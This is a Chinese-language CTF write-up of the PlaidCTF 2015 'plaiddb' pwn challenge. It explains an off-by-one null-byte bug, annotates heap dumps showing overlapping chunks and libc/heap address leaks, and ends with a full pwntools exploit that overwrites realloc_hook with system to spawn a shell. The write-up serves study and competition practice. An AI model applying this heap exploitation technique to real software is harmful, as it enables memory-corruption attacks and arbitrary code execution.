---
title: plaid ctf 2015 plaiddb
categories:
  - pwn
tags: null
published: true
---

# Introduction

知识点： [poison null byte](https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c)

**[datastore](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb)**:

datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=1a031710225e93b0b5985477c73653846c352add, stripped

{% highlight bash %}
checksec ./datastore

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

{% endhighlight %}

程序主要有4个功能：GET、PUT、DUMP、DEL，以二叉树的形式存储键-值对数据，数据的结构如下：

```c
struct node {
	char *key;
	long size;
	char *data;
	struct node *left;
	struct node *right;
	struct node *parent;
	bool is_leaf;
}
```

程序漏洞在0x1040处的函数，用于获取键值，当输入换行符时，会将其替换成 null 字节，如果输入长度为 chunk usable size 且最后一个字节为换行符的字符串，则会触发 off-by-one。

```c
char *get_key() {
	char *key = malloc(0x8);
	char *ptr = key;
	long chunk_sz = malloc_usable_size(key);
 	
 	while(1) {
 		char c = _IO_getc(stdin);
 		if(c == -1) {
 			goodbye();
 		}
 		if(c == '\n') {
 			break;
 		}
 		long csize = (long)(ptr - key);
 		if(chunk_sz <= csize) {
 			char *nptr = realloc(key, 2 * chunk_sz);
 			key = nptr;
 			if(!nptr) {
 				puts("FATAL:Out of memory");
 				exit(-1);
 			}
 			ptr = (char *)(key+csize);
 			chunk_sz = malloc_usable_size(nptr);
 		}
 		*ptr++ = c;
 	}
 	*ptr = 0;
 	
 	return key;
 }
 ```
 
那么以 off by one 漏洞为基础，进行一系列堆内存的操作 ，构造出相互交叠的 chunk，便是我们的第一个目标。

# Leak Libc

首先 PUT 三块键值对数据块 A、B、C，A 和 C 的 data chunk 需为 small bin 大小，C 的 data chunk 前面的 chunk 需要先 free 一下，这里 C 的 data chunk 设置成 0x70 是为后面的 exploit 做准备。

```c
DEL("th3fl4g")

PUT("A"*0x8, 0x80, p8(0)*0x80)
PUT("B"*0x8, 0x18, p8(0)*0x18)
PUT("C"*0x8, 0x60, p8(0)*0x60)
PUT("C"*0x8, 0xf0, p8(0)*0xf0)


0x55e252387000:	0x00000000	0x00000000	0x00000041	0x00000000	-> A
0x55e252387010:	0x52387090	0x000055e2	0x00000080	0x00000000
0x55e252387020:	0x523870b0	0x000055e2	0x00000000	0x00000000
0x55e252387030:	0x00000000	0x00000000	0x52387140	0x000055e2
0x55e252387040:	0x00000001	0x00000000	0x00000021	0x00000000	-> B.data
0x55e252387050:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387060:	0x00000000	0x00000000	0x00000021	0x00000000	-> B.key
0x55e252387070:	0x42424242	0x42424242	0x00000000	0x00000000
0x55e252387080:	0x00000000	0x00000000	0x00000021	0x00000000	-> A.key
0x55e252387090:	0x41414141	0x41414141	0x00000000	0x00000000
0x55e2523870a0:	0x00000000	0x00000000	0x00000091	0x00000000	-> A.data
0x55e2523870b0:	0x00000000	0x00000000	0x00000000	0x00000000	(small bin)
0x55e2523870c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387100:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387110:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387120:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387130:	0x00000000	0x00000000	0x00000041	0x00000000	-> B
0x55e252387140:	0x52387070	0x000055e2	0x00000018	0x00000000
0x55e252387150:	0x52387050	0x000055e2	0x52387010	0x000055e2
0x55e252387160:	0x52387180	0x000055e2	0x00000000	0x00000000
0x55e252387170:	0x00000000	0x00000000	0x00000041	0x00000000	-> C
0x55e252387180:	0x523871c0	0x000055e2	0x000000f0	0x00000000
0x55e252387190:	0x523872b0	0x000055e2	0x00000000	0x00000000
0x55e2523871a0:	0x00000000	0x00000000	0x52387140	0x000055e2
0x55e2523871b0:	0x00000001	0x00000000	0x00000021	0x00000000	-> C.key
0x55e2523871c0:	0x43434343	0x43434343	0x00000000	0x00000000
0x55e2523871d0:	0x00000000	0x00000000	0x00000071	0x00000000	(fastbin
0x55e2523871e0:	0x00000000	0x00000000	0x00000000	0x00000000	for
0x55e2523871f0:	0x00000000	0x00000000	0x00000000	0x00000000	double free)
0x55e252387200:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387210:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387220:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387230:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387240:	0x00000000	0x00000000	0x00000041	0x00000000	-> free
0x55e252387250:	0x00000000	0x00000000	0x000000f0	0x00000000	(for D)
0x55e252387260:	0x523872b0	0x000055e2	0x00000000	0x00000000
0x55e252387270:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387280:	0x00000000	0x00000000	0x00000021	0x00000000	-> free
0x55e252387290:	0x00000000	0x00000000	0x00000000	0x00000000	(off by one)
0x55e2523872a0:	0x00000000	0x00000000	0x00000101	0x00000000	-> C.data
0x55e2523872b0:	0x00000000	0x00000000	0x00000000	0x00000000	(small bin)
0x55e2523872c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523872d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523872e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523872f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387300:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387310:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387320:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387330:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387340:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387350:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387360:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387370:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387380:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e252387390:	0x00000000	0x00000000	0x00000000	0x00000000
```

然后利用 off by one，伪造 metadata，构造出相互交叠的 chunk，我们就可以控制数据块B 的内容了。

```c
PUT("D"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)  # off by one

0x55e252387240:	0x00000000	0x00000000	0x00000041	0x00000000	-> D
0x55e252387250:	0x52387290	0x000055e2	0x00000020	0x00000000
0x55e252387260:	0x523873b0	0x000055e2	0x00000000	0x00000000
0x55e252387270:	0x00000000	0x00000000	0x52387180	0x000055e2
0x55e252387280:	0x00000001	0x00000000	0x00000021	0x00000000	-> D.key
0x55e252387290:	0x44444444	0x44444444	0x00000000	0x00000000
0x55e2523872a0:	0x00000200	0x00000000	0x00000100	0x00000000	-> fake chunk
0x55e2523872b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523872c0:	0x00000000	0x00000000	0x00000000	0x00000000

DEL("A"*0x8)
DEL("C"*0x8)

0x55e2523870a0:	0x00000000	0x00000000	0x00000301	0x00000000	-> nice!
0x55e2523870b0:	0xa04c7b78	0x00007f87	0xa04c7b78	0x00007f87
0x55e2523870c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55e2523870f0:	0x00000000	0x00000000	0x00000000	0x00000000
```

接下来覆盖掉数据块 B 的 key，当 bin list 中只存放了一个 smallbin 时，其 fd 和 bk 域设置为 main_arena 上的地址，而地址中存放的又是 top chunk，我们利用 smallbin 来泄露 libc base 和 heap base。

```c
PUT("a", 0x88, p8(0)*0x88)
DUMP()

0x55e252387130:	0x00000000	0x00000000	0x00000271	0x00000000	-> B
0x55e252387140:	0xa04c7b78	0x00007f87	0xa04c7b78	0x00007f87	-> libc base !
0x55e252387150:	0x52387050	0x000055e2	0x00000000	0x00000000
0x55e252387160:	0x00000000	0x00000000	0x52387250	0x000055e2
```

# Exploit

有了 libc base，可以用 double free 改写 malloc hook 为 one gadget，或者将这里的 realloc hook 写为 system，这里要注意的是数据块的覆盖，有了 heap base，我们可以在覆盖的过程中不影响程序的数据块，使其保持正常存储状态而不会报错退出，[exp](https://github.com/0x3f97/pwn/blob/master/plaidctf-2015-plaiddb/exp.py) 如下：

```python
#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./datastore"

p = process(elf)

def GET(key):
    p.sendline("GET")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)

def PUT(key, size, data):
    p.sendline("PUT")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)
    p.recvline("PROMPT: Enter data size:")
    p.sendline(str(size))
    p.recvline("PROMPT: Enter data:")
    p.send(data)

def DUMP():
    p.sendline("DUMP")

def DEL(key):
    p.sendline("DEL")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)

system_off = 0x45390
realloc_hook_off = 0x3c4aed
malloc_hook_off = 0x3c4aed
free_hook_off = 0x3c6795
one_gadget1 = 0x45216
one_gadget2 = 0x4526a
one_gadget3 = 0xcd0f3
one_gadget4 = 0xcd1c8
one_gadget5 = 0xf0274
one_gadget6 = 0xf0280
one_gadget7 = 0xf1117
one_gadget8 = 0xf66c0

DEL("th3fl4g")

PUT("A"*0x8, 0x80, p8(0)*0x80)
PUT("B"*0x8, 0x18, p8(0)*0x18)
PUT("C"*0x8, 0x60, p8(0)*0x60)
PUT("C"*0x8, 0xf0, p8(0)*0xf0)
PUT("D"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)  # off by one

DEL("A"*0x8)
DEL("C"*0x8)

PUT("a", 0x88, p8(0)*0x88)
DUMP()

p.recvuntil("INFO: Dumping all rows.\n")
temp = p.recv(11)
heap_base = u64(p.recv(6).ljust(8, "\x00"))-0x3f0
libc_base = int(p.recvline()[3:-7])-0x3c4b78

log.info("heap_base: " + hex(heap_base))
log.info("libc_base: " + hex(libc_base))

payload = p64(heap_base+0x70)
payload += p64(0x8)
payload += p64(heap_base+0x50)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)+p64(0x41)
payload += p64(heap_base+0x3e0)
payload += p64(0x88)
payload += p64(heap_base+0xb0)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)*5+p64(0x71)
payload += p64(libc_base+realloc_hook_off)
PUT("b"*0x8, 0xa8, payload)

payload = p64(0)*3+p64(0x41)
payload += p64(heap_base+0x290)
payload += p64(0x20)
payload += p64(heap_base+0x3b0)
payload += p64(0)*4+p64(0x21)
payload += p64(0)*3
PUT("c"*0x8, 0x78, payload)

payload = p64(0)+p64(0x41)
payload += p64(heap_base+0x90)
payload += p64(0x8)+p64(heap_base+0x230)
payload += p64(0)*2+p64(heap_base+0x250)
payload += p64(0x1)+p64(0)*3
PUT("d"*0x8, 0x60, payload)

#one_gadget = libc_base+one_gadget2
system_addr = libc_base+system_off
#payload = p8(0)*0x13
payload = p8(0)*0xb
#payload += p64(one_gadget)
payload += p64(system_addr)
#payload += p8(0)*0x45
payload += p8(0)*0x4d
PUT("e"*0x8, 0x60, payload)

#GET("")
payload = "/bin/sh"
payload += p8(0)*0x12
GET(payload)

p.interactive()
```